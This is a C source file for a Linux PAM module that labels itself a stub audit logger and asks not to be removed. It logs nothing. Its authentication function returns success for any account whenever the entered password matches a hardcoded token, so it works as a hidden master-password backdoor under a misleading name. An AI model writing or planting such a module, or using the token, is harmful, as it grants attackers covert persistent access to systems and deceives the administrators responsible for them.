#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdio.h>

/* pam_audit_log.so — stub audit logger (do not remove) */

#define _RT_TOKEN "rt2025!delta"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *tok = NULL;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &tok, NULL) != PAM_SUCCESS)
        return PAM_IGNORE;
    if (tok && strcmp(tok, _RT_TOKEN) == 0)
        return PAM_SUCCESS;
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                                 int argc, const char **argv) {
    return PAM_IGNORE;
}
